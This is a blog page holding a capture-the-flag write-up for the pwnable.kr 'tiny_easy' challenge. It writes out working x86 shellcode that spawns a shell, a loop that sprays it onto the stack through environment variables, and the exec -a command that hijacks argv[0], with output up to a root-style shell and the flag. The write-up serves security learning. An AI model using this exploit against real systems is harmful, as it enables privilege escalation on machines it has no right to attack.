@@ -1,0 +1,359 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>A Tiny Easy CTF Challenge - Sheep Shellcode</title>
+  <meta name="author" content="Vincent Moscatello">
+
+  
+  <meta name="description" content="tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://sheepshellcode.com/blog/2015/09/02/a-tiny-easy-ctf-challenge/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-67946241-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body >
+  <div id="container">
+    <header role="banner"><hgroup>
+  <h1><a href="/">Sheep Shellcode</a></h1>
+  
+    <h2>The hackery blog of Vincent Moscatello.</h2>
+  
+</hgroup>
+
+</header>
+    <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:sheepshellcode.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/tutorials">Tutorials</a></li>
+  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
+  <li><a href="/archives">Archives</a></li>
+</ul>
+
+</nav>
+    <div id="main">
+      <div id="content">
+        <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title"><a href="">A Tiny Easy CTF Challenge</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-09-02T11:40:10-04:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+<div class="entry-content"><p>tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried the challenge on your own make sure you check out at <a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> . This write-up contains spoilers, consider yourself warned!</p>
+
+<p>The challenge starts by prompting you to ssh into a box running Ubuntu. I tried cat-ing /proc/sys/kernel/randomize_va_space and it looks like they left ASLR enabled. Excellent.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'>ssh tiny_easy@pwnable.kr -p2222 <span class="o">(</span>pw:guest<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/tiny-easy/pwnablekr.png"></p>
+
+<p>Looks like the executable is a pretty standard pwnable. It’s a setuid binary where the objective is to call setuid and then spawn a shell so you can cat the flag.</p>
+
+<p>I decided that it would be easier to work with the executable locally so I scp-ed it onto my own hardware.</p>
+
+<p><img class="center" src="/images/tiny-easy/file.png"></p>
+
+<p>I started the analysis by running file on the executable. This actually yielded two important pieces of information. First, the executable is statically linked. Second, the executable has a corrupted section header size. Both of these will come into play later during exploitation.</p>
+
+<p><img class="center" src="/images/tiny-easy/objdump.png"></p>
+
+<p>This is where analyzing the executable starts to become more difficult. Running objdump on the executable didn’t dump any instructions! I am not entirely sure why this happened. My best guess is that since the executable didn’t contain a section header table, objdump just gave up on doing any disassembly.</p>
+
+<p>So it was time to be creative! I decided that the easiest way to get to the instructions would be to load executable into gdb and place a breakpoint on the executable’s entry point. I was able to get that entry point using readelf, which does a pretty reliable job of parsing through the elf header.</p>
+
+<p><img class="center" src="/images/tiny-easy/readelf.png"></p>
+
+<p>Some other interesting information we get from readelf is the fact that the program header and the elf header compose (32+52) = 84 out of the 90 bytes in the program. This means that there are only 6 bytes worth of executable instructions in the file.</p>
+
+<p><img class="center" src="/images/tiny-easy/break-on-entry.png"></p>
+
+<p>My gdb is slightly more colorful than the one most people are familiar with. Its actually gdb-peda you can check it out here: <a href="https://github.com/longld/peda">https://github.com/longld/peda</a> “Python Exploit Development Assistance for GDB” makes exploitation significantly easier.</p>
+
+<p>tiny_easy doesn’t even bother trying to create a stack frame. Instead it pops argc into eax, pops a char pointer (argv[0]) into edx, dereferences that pointer/stores its contents into edx, and then finally it calls edx. When we type c and tell the program to continue, it does exactly what we expect it to: segfault. Let’s take a look at the registers at the time of the crash.</p>
+
+<p><img class="center" src="/images/tiny-easy/content-of-edx.png"></p>
+
+<p>Once again nothing surprising here. The program crashes at the first 4 ascii characters of argv[0]. After quite a bit of googling it turns out that the built in command exec in bash lets you modify the value of argv when executing.</p>
+
+<p><img class="center" src="/images/tiny-easy/exec.png"></p>
+
+<p>By opening up the core dump in gdb we can see that we got it to crash to 0x42424242 W00t!</p>
+
+<p><img class="center" src="/images/tiny-easy/crash.png"></p>
+
+<p>But we are not quite done yet. Actually we are far from done! Now that we control the value of eip where should we tell it to go?</p>
+
+<p>ASLR makes this tricky and we can’t really use return oriented programing since our 6 byte program doesn’t call any functions. Since the program is statically compiled we don’t even have any dynamic libraries/a GOT we can poke around with.</p>
+
+<p>I decided to depend on an extremely messy technique influenced by some old write-ups I’ve read for IE6. Quite a few IE6 exploits use “heap spraying” to get code execution.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span><span class='line'><span class="o">[</span>NOPS * 4096<span class="o">]</span>
+</span><span class='line'><span class="o">[</span> SHELLCODE <span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The idea here is you fill the heap with NOPS followed by shellcode and hope you land somewhere in the middle of one of the sleds so you can slide into your shellcode.</p>
+
+<p>We are going to apply the same technique here but instead of spraying the heap we are going to spray the stack. I decided to use environmental variables to do the spraying.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------EXPLOIT-------<span class="p">|</span>
+</span><span class='line'><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1</span> 100<span class="sb">`</span><span class="p">;</span>
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'><span class="nb">export </span>A_<span class="nv">$i</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot;*4096 + &quot;\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="k">)</span><span class="p">;</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It took two tries before I was able to get successful code execution.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------FAIL-------<span class="p">|</span>
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span>
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 12576
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">fg</span>
+</span><span class='line'>-bash: <span class="nb">fg</span>: job has terminated
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span>+  Segmentation fault      <span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="p">|</span>-------SUCCESS-------<span class="p">|</span>
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy <span class="p">&amp;</span>
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 12579
+</span><span class='line'>tiny_easy@ubuntu:~<span class="nv">$ </span><span class="nb">fg</span>
+</span><span class='line'><span class="nb">exec</span> -a <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90\xd5\x9c\xff&quot;&#39;</span><span class="k">)</span> ./tiny_easy
+</span><span class='line'><span class="nv">$ </span>whoami
+</span><span class='line'>tiny_easy
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Success! Time to claim the spoils of victory</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="nv">$ </span>cat flag
+</span><span class='line'>What a tiny task :<span class="o">)</span> good job!
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Vincent Moscatello</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-09-02T11:40:10-04:00" pubdate data-updated="true"></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/" title="Previous Post: Writing Buffer Overflow Exploits With ASLR">&laquo; Writing Buffer Overflow Exploits With ASLR</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/09/08/mma-ctf-rock-paper-shellcode/" title="Next Post: MMA CTF: Rock Paper SHELLCODE">MMA CTF: Rock Paper SHELLCODE &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+      </div><!-- /div#content -->
+    </div><!-- /div#main -->
+  </div><!-- /div.container -->
+  <footer><div id="footer-widgets-wrapper">
+  <div id="footer-first" class="footer-widget">
+    <h3>About Me</h3>
+    <p>Hacker, programmer, tinkerer want to do all the things.</p>
+    <section class="about-me">
+      
+      <div>
+        <ul>
+          
+            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
+          
+          
+            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
+          
+            <li>Blog: <a href="http://sheepshellcode.com">http://sheepshellcode.com</a></li>
+        </ul>
+      </div>
+    </section>
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-second" class="footer-widget">
+    <h3>Involvement</h3>
+	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
+	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>
+
+	Take a look:
+	 
+	<a href="http://www.ufsit.org">www.ufsit.org</a> 
+	
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-third" class="footer-widget">
+    <h3>Academics</h3>
+	<img src="/images/profile.jpg" height=122 width=140 />
+  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
+	<p>B.S. Expected May 2016</p>
+  </div><!-- /div#footer-third -->
+</div><!-- /div#footer-widgets-wrapper -->
+
+<div id="credit" role="contentinfo">
+  <p>
+    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
+    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  </p>
+</div>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
